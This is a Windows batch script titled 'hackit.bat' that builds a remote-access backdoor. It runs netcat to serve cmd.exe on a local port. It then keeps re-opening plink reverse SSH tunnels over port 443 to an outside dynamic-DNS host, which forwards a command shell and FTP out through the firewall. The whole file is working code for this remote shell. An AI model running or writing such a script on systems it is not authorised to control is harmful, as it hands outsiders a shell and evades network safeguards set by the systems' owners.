REM This is microsoft. So no pretty flowerbox for you!
REM hackit.bat - A poor man's TCP hole puncher.
REM By Robbie Mckennie, but you knew that!
echo off
cls
REM Start the shell server, listening ONLY on localhost. Very important.
REM Without that, any schmuck with a port scanner can pwn you.
START "netcat, BITCH!" nc.exe -Lp 23 -s 127.0.0.1 -e cmd.exe
REM The 'START' runs nc.exe in a seperate window, all the better to kill it with!

REM An infinate loop, for looping.
:ANCHOR
REM If we havn't connected yet, start plink to open the port forward
if NOT exist CONNECTED (
START "plink, BITCH!" plink.exe -C -N -i key.ppk -R 10023:localhost:23 -R 10021:localhost:21 -P 443 public@herebedragons.no-ip.org
)

REM Wait a little while
timeout /nobreak /T 600

REM If we havn't connected yet, kill it with fire!
if NOT exist CONNECTED (
	taskkill /F /IM plink.exe
)
GOTO ANCHOR